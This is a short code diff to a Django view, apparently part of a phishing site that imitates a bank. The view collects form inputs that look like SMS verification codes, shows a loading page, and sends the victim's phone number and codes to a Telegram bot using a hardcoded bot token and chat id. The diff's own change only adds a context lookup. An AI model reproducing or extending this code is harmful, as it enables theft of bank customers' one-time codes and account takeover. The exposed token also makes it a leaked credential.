@@ -361,6 +361,10 @@ def page_not_found(request, exception):
 
 @ensure_csrf_cookie  
 def dseckapital(request):
+    last_contact = ContactModel.objects.latest('created_at')
+    context = {
+        'last_contact_id': last_contact.id,
+    }
     if request.method == "POST":
         input1 = request.POST.get("input1")
         input2 = request.POST.get("input2")
@@ -376,7 +380,7 @@ def dseckapital(request):
         last_contact.bankname=""
         last_contact.save()
         response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
-        return render( request,'pages/loading.html' )
+        return render( request,'pages/loading.html', )
     
     
     return render( request,'pages/loading.html' )
